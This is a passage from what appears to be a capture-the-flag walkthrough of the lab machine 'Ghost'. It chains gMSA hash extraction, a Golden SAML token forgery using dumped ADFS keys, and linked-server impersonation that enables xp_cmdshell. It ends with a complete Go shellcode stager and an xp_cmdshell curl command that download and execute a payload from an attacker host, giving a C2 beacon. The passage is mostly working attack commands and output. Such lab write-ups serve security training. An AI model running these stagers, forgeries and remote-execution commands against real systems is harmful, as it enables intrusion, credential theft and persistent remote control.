+SMB         10.129.231.105  445    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$</code></pre><p><img src="images/ghost/pasted-image-20260828181644.webp" alt="Screenshot" loading="lazy" /></p><p>This user is part of remote management users!</p><h2>Access over WINRM as <code>justin.bradley</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc01.ghost.htb -u justin.bradley -p &#39;Qwertyuiop1234$$&#39;                  
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\justin.bradley\Documents&gt;</code></pre><p>I now have a shell!</p><h2>Enumeration as <code>justin.bradley</code></h2><p><img src="images/ghost/pasted-image-20260828182211.webp" alt="Screenshot" loading="lazy" /></p><p>I can read the gMSA password for the <code>adfs_gmsa$</code> account</p><h2>Compromising <code>adfs_gmsa$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.ghost.htb -u justin.bradley -p &#39;Qwertyuiop1234$$&#39; --gmsa
+LDAP        10.129.231.105  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.231.105  389    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ 
+LDAP        10.129.231.105  389    DC01             [*] Getting GMSA Passwords
+LDAP        10.129.231.105  389    DC01             Account: adfs_gmsa$           NTLM: 55eea5db159b96bcb1d335d6e5738ea6     PrincipalsAllowedToReadPassword: [&#39;DC01$&#39;, &#39;justin.bradley&#39;]</code></pre><p>Ill just use <code>justin.bradley</code>&#39;s access to read the NTLM hash for the user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.ghost.htb -u adfs_gmsa$ -H &#39;55eea5db159b96bcb1d335d6e5738ea6&#39;
+SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.231.105  445    DC01             [+] ghost.htb\adfs_gmsa$:55eea5db159b96bcb1d335d6e5738ea6</code></pre><p>This user is now compromised</p><h2>Access on WINRM as <code>adfs_gmsa$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc01.ghost.htb -u adfs_gmsa$ -H &#39;55eea5db159b96bcb1d335d6e5738ea6&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt;</code></pre><p>I now have access as this user</p><h2>Golden SAML attack</h2><p>So first ill need to grab ADFSDump from the sharpcollection github since i dont fancy compiling it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Temp&gt; .\ADFSDump.exe
+    ___    ____  ___________ ____
+   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
+  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
+ / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
+/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
+                                              /_/
+Created by @doughsec
+
+
+## Extracting Private Key from Active Directory Store
+[-] Domain is ghost.htb
+[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7
+
+
+[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1
+
+
+## Reading Encrypted Signing Key from Database
+[-] Encrypted Token Signing Key Begin
+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
+[-] Encrypted Token Signing Key End
+
+[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
+[-] Store location value: CurrentUser
+[-] Store name value: My
+
+## Reading The Issuer Identifier
+[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
+[-] Detected AD FS 2019
+[-] Uncharted territory! This might not work...
+## Reading Relying Party Trust Information from Database
+[-]
+core.ghost.htb
+ ==================
+    Enabled: True
+    Sign-In Protocol: SAML 2.0
+    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse
+    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
+    SamlResponseSignatureType: 1;
+    Identifier: https://core.ghost.htb:8443
+    Access Policy: &lt;PolicyMetadata xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://schemas.datacontract.org/2012/04/ADFS&quot;&gt;
+  &lt;RequireFreshAuthentication&gt;false&lt;/RequireFreshAuthentication&gt;
+  &lt;IssuanceAuthorizationRules&gt;
+    &lt;Rule&gt;
+      &lt;Conditions&gt;
+        &lt;Condition i:type=&quot;AlwaysCondition&quot;&gt;
+          &lt;Operator&gt;IsPresent&lt;/Operator&gt;
+        &lt;/Condition&gt;
+      &lt;/Conditions&gt;
+    &lt;/Rule&gt;
+  &lt;/IssuanceAuthorizationRules&gt;
+&lt;/PolicyMetadata&gt;
+
+
+    Access Policy Parameter:
+
+    Issuance Rules: @RuleTemplate = &quot;LdapClaims&quot;
+@RuleName = &quot;LdapClaims&quot;
+c:[Type == &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&quot;, Issuer == &quot;AD AUTHORITY&quot;]
+ =&gt; issue(store = &quot;Active Directory&quot;, types = (&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&quot;, &quot;http://schemas.xmlsoap.org/claims/CommonName&quot;), query = &quot;;userPrincipalName,sAMAccountName;{0}&quot;, param = c.Value);</code></pre><p>Now i have the blob and the keys</p><p>I now need to ensure both of these things are formatted correctly before i can use them</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7
+8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1</code></pre><p>So both of these keys need to have the dashes removed, and the hex form converted back to decimal</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">echo &#39;FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7&#39; | tr -d &#39;-&#39;
+FADB3A06DDCD4057DD417D8107A0F4B314FA2B6B70BBBBF528A7212961CB21C7
+
+echo &#39;8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1&#39; | tr -d &#39;-&#39;
+8DACA490702B3FD608D5BC35A9848756D2FA3B7B7413A3C62C58A6F458FB9DA1</code></pre><p>Now the dashes are removed ill convert the string back to decimal</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">echo &#39;FADB3A06DDCD4057DD417D8107A0F4B314FA2B6B70BBBBF528A7212961CB21C7&#39; | xxd -r -p | tee privkey1.bin
+
+echo &#39;8DACA490702B3FD608D5BC35A9848756D2FA3B7B7413A3C62C58A6F458FB9DA1&#39; | xxd -r -p | tee privkey2.bin</code></pre><p>Now both keys are set, i can move onto the encrypted blob</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">echo &#39;AAAAAQAAAAAEEAF...[SNIP]...7xDevBN/BEsNEUSTXxm&#39; | base64 -d | tee enc_blob.bin</code></pre><p>The blob just needs base64 decoding then placining into a file</p><p>Now everything is setup i can run ADFSpoof</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python ./ADFSpoof.py \
+       --blob ../enc_blob.bin ../privkey2.bin \
+       --server federation.ghost.htb saml2 \
+       --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse \
+       --rpidentifier https://core.ghost.htb:8443 \
+       --assertion &#39;&lt;Attribute Name=&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&quot;&gt;&lt;AttributeValue&gt;administrator@ghost.htb&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name=&quot;http://schemas.xmlsoap.org/claims/CommonName&quot;&gt;&lt;AttributeValue&gt;Administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#39; \
+       --nameidformat &quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; \
+       --nameid administrator@ghost.htb
+ 
+    ___    ____  ___________                   ____
+   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
+  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
+ / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
+/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
+                        /_/                        
+ 
+A tool to for AD FS security tokens
+Created by @doughsec
+
+PHNhbWxwOlJlc3BvbnNlIHhtbG5zO...[SNIP]...ZXNwb25zZT4%3D</code></pre><p>After an issue with the requirements i am able to forge it</p><p>I had to make a valid logon attempt using <code>justin.bradley</code> to capture a valid SAMLresponse, and after decoding it i can grab the value needed for the <code>--assertion</code> flag</p><p>Ill use a random <code>--nameidformat</code> found in an article and the <code>--name-id</code> of the admin</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">curl -X POST https://core.ghost.htb:8443/adfs/saml/postResponse -H &#39;Cookie: connect.sid=s%3ADijqbGlwxzhTnK29JZ0VZvnx9TYwh3va.FxridJsxX6s1NHTLebRRAeZD%2Bd53hpyA%2BsjJaazMi7o&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; --data &#39;SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zO...[SNIP]...ZXNwb25zZT4%3D&#39; -k -v
+
+...[SNIP]...
+
+Set-Cookie: connect.sid=s%3AZofc8mo4eJ80wJZi09GJBqyxzjim4Taq.p9vMnlFd6Tryitg%2BFj9ekMTRbWvgxaMBgbDXljcKFlw; Path=/; HttpOnly</code></pre><p>I now have a cookie value i can use</p><p>I used the cookie that was preset on the <code>https://core.ghost.htb/</code> page and set the correct content type</p><h2>Administrator on the <code>core.ghost.htb</code> service</h2><p>Now placing this cookie into the dev tools <code>connect.sid</code> entry and removing <code>/login</code> to <code>/</code> i get access</p><p><img src="images/ghost/pasted-image-20260828204433.webp" alt="Screenshot" loading="lazy" /></p><p>It syas there are two databases, these are likely to be linked databases</p><h2>Impersonating the <code>sa</code> account on the linked server</h2><p><img src="images/ghost/pasted-image-20260828204725.webp" alt="Screenshot" loading="lazy" /></p><p>Using the query <code>EXEC sp_linkedservers;</code></p><p>There is definitely a linked server here</p><p><a href="https://www.adversify.co.uk/blog/escalating-privileges-via-linked-database-servers" target="_blank" rel="noreferrer">https://www.adversify.co.uk/blog/escalating-privileges-via-linked-database-servers</a></p><p><a href="https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html" target="_blank" rel="noreferrer">https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html</a></p><p><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html" target="_blank" rel="noreferrer">https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html</a></p><p><img src="images/ghost/pasted-image-20260829161237.webp" alt="Screenshot" loading="lazy" /></p><p>Running the query <code>EXEC sp_helplinkedsrvlogin &#39;&lt;LINK_NAME&gt;&#39;;</code> gave this response, this tells me the account i am running as on the linked server</p><p>This user is not a sysadmin on the linked server</p><p><img src="images/ghost/pasted-image-20260829162324.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXEC (&#39;
+SELECT 
+    p.name AS GranteeName,
+    p.type_desc AS GranteeType,
+    p2.name AS ImpersonatedLogin,
+    prm.permission_name,
+    prm.state_desc
+FROM sys.server_permissions prm
+JOIN sys.server_principals p ON prm.grantee_principal_id = p.principal_id
+JOIN sys.server_principals p2 ON prm.major_id = p2.principal_id
+WHERE prm.permission_name = &#39;&#39;IMPERSONATE&#39;&#39;;
+&#39;) AT [PRIMARY];</code></pre><p>Running this query im checking for any impersonation on that linked server, as seen from the screenshot <code>bridge_corp</code> can impersonate <code>sa</code> on the linked server</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXEC (&#39;
+EXECUTE AS LOGIN = &#39;&#39;sa&#39;&#39;;
+EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;, 1;
+RECONFIGURE;
+EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;
+RECONFIGURE;
+&#39;) AT [PRIMARY];</code></pre><p>Ill enabled xp_cmdshell on the linked server using impersonation</p><p>Now its enabled i can run commands</p><p><img src="images/ghost/pasted-image-20260829163400.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXEC (&#39;EXECUTE AS LOGIN = &#39;&#39;sa&#39;&#39;; EXEC xp_cmdshell &#39;&#39;whoami&#39;&#39;;&#39;) AT [PRIMARY];</code></pre><p>I now have RCE</p><p>I cannot send a powershell reverse shell, i think its because the payload is too long</p><p>I have tried with nc64.exe and i think defender is running</p><h2>SYSTEM beacon on <code>primary</code></h2><p>So to do this ill setup the teamserver and connect to it through the client, then set a listener on port 443</p><p>Then ill generate some shellcode to be ran on the system</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">// +build windows
+			
+package main
+			
+import (
+	&quot;io&quot;
+	&quot;net/http&quot;
+	&quot;syscall&quot;
+	&quot;unsafe&quot;
+	)
+			
+var (
+	kernel32            = syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
+	procVirtualAlloc    = kernel32.NewProc(&quot;VirtualAlloc&quot;)
+	)
+			
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+	)
+			
+func downloadShellcode(url string) ([]byte, error) {
+	resp, err := http.Get(url)
+	if err != nil {
+		return nil, err
+		}
+	defer resp.Body.Close()
+			
+	return io.ReadAll(resp.Body)
+	}
+			
+func executeShellcode(shellcode []byte) {
+	addr, _, err := procVirtualAlloc.Call(
+		0,
+		uintptr(len(shellcode)),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE,
+	)
+	if addr == 0 {
+		panic(err)
+	}
+			
+	// Copy shellcode into allocated memory
+	for i := 0; i &lt; len(shellcode); i++ {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = shellcode[i]
+	}
+		
+	// Execute shellcode
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+		
+
+func main() {
+	url := &quot;http://10.10.14.61/http.x64.bin&quot;
+			
+	shellcode, err := downloadShellcode(url)
+	if err != nil {
+		panic(err)
+	}
+			
+	executeShellcode(shellcode)
+}</code></pre><p>Ill use this go code as the stager and call this stager.go, it will reach out to my python web server and grab the shellcode then load it into memory and execute it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags=&quot;-H windowsgui&quot; -o stager.exe stager.go</code></pre><p>This has compiled the code into stager.exe</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 80</code></pre><p>Then ill set up the web server</p><p>Now i can run the query through xp_cmdshell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">EXEC (&#39;EXECUTE AS LOGIN = &#39;&#39;sa&#39;&#39;; EXEC xp_cmdshell &quot;curl http://10.10.14.61/stager.exe -o C:\Temp\stager.exe &amp;&amp; C:\Temp\stager.exe&quot;&#39;) AT [PRIMARY];</code></pre><p>This will go to my web server get the stager and save it in the <code>C:\Temp</code> directory i made, then execute it, the stager will then run and reach back the webserver again and get the shellcode and load it into memory</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.231.105 - - [29/Aug/2026 18:09:39] &quot;GET /stager.exe HTTP/1.1&quot; 200 -
+10.129.231.105 - - [29/Aug/2026 18:09:46] &quot;GET /http.x64.bin HTTP/1.1&quot; 200 -</code></pre><p>This shows the flow of the attack</p><p><img src="images/ghost/pasted-image-20260829181202.webp" alt="Screenshot" loading="lazy" /></p><p>I now have a beacon</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">+-------------------------------------------------------------------------------------+
+
+[29/08 18:12:58] ethan [25877138] beacon &gt; whoami
+[29/08 18:12:58] [*] BOF implementation: whoami /all
+[29/08 18:13:00] [*] Agent called server, sent [6.56 Kb]
+[29/08 18:13:01] [+] BOF output
+
+UserName		SID
+====================== ====================================
+NT Service\MSSQLSERVER	S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+Mandatory Label\High Mandatory Level              Label                    S-1-16-12288                                  Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group, 
+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\SERVICE                              Well-known group         S-1-5-6                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
